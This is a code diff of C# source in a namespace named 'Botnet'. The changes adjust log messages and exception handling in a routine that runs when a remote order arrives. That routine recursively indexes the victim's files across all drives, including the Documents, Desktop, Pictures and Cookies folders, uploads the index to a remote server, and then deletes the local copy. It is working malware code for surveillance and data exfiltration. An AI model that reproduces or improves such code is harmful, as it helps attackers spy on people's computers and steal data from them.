@@ -69,7 +69,7 @@ namespace Botnet
             {
                 Console.Write("Initializing...");
                 Initialize();
-                Console.WriteLine(" DONE! MachineID=" + machineID);
+                Console.WriteLine("Initialization completed! MachineID=" + machineID);
             }
 
             while (true)
@@ -259,6 +259,8 @@ namespace Botnet
 
                     inspectHardwareRunning = false;
                     orders.inspectHardware = false;
+
+                    Console.WriteLine("Hardware inspection completed!");
                 }
                 catch (Exception e)
                 {
@@ -271,68 +273,70 @@ namespace Botnet
         {
             new Thread(() =>
             {
-                try
-                {
-                    inspectFilesRunning = true;
-                    inspectFilesLoading = false;
-                    Thread.CurrentThread.IsBackground = true;
+                inspectFilesRunning = true;
+                inspectFilesLoading = false;
+                Thread.CurrentThread.IsBackground = true;
 
-                    filesIndex = "";
-                    foreach (DriveInfo d in DriveInfo.GetDrives())
-                    {
-                        if (d.Name.Equals(Path.GetPathRoot(Environment.SystemDirectory)))
-                        {
-                            RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Downloads));
-                            RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Favorites));
-                            RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Contacts));
-                            RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Documents));
-                            RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Desktop));
-                            RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Pictures));
-                            RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Music));
-                            RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Videos));
-                            RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Recent));
-                            RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Searches));
-                            RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Cookies));
-                            RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Links));
-                            RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.SavedGames));
-                        }
-                        else
-                        {
-                            RecursiveIndexFiles(d.Name);
-                        }
-                    }
-                    File.WriteAllText(Utility.filesIndex, filesIndex.Trim());
-                    Utility.UploadFile(Utility.filesIndex, Utility.UPLOAD_INDEX_FILE);
-                    File.Delete(Utility.filesIndex);
-                    inspectFilesRunning = false;
-                    orders.inspectFiles = false;
-                }
-                catch (Exception e)
+                filesIndex = "";
+                foreach (DriveInfo d in DriveInfo.GetDrives())
                 {
-                    Console.WriteLine(e);
+                    if (d.Name.Equals(Path.GetPathRoot(Environment.SystemDirectory)))
+                    {
+                        RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Downloads));
+                        RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Favorites));
+                        RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Contacts));
+                        RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Documents));
+                        RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Desktop));
+                        RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Pictures));
+                        RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Music));
+                        RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Videos));
+                        RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Recent));
+                        RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Searches));
+                        RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Cookies));
+                        RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Links));
+                        RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.SavedGames));
+                    }
+                    else
+                    {
+                        RecursiveIndexFiles(d.Name);
+                    }
                 }
+                File.WriteAllText(Utility.filesIndex, filesIndex.Trim());
+                Utility.UploadFile(Utility.filesIndex, Utility.UPLOAD_INDEX_FILE);
+                File.Delete(Utility.filesIndex);
+                inspectFilesRunning = false;
+                orders.inspectFiles = false;
+
+                Console.WriteLine("Files inspection completed!");
             }).Start();
         }
 
         static void RecursiveIndexFiles(string directory)
         {
-
-            foreach (string file in Directory.GetFiles(directory))
+            try
             {
-                try
+                foreach (string file in Directory.GetFiles(directory))
                 {
-                    filesIndex += file + "\t" + HardwareInfo.BytesToHuman(new Delimon.Win32.IO.FileInfo(file).Length) + "\n";
-                }
-                catch (Exception)
-                {
+                    try
+                    {
+                        Console.WriteLine(file);
+                        filesIndex += file + "\t" + HardwareInfo.BytesToHuman(new FileInfo(file).Length) + Environment.NewLine;
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine(e);
+                    }
 
                 }
+
                 foreach (string subdir in Directory.GetDirectories(directory))
                 {
-
                     RecursiveIndexFiles(subdir);
                 }
-
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e);
             }
         }
 
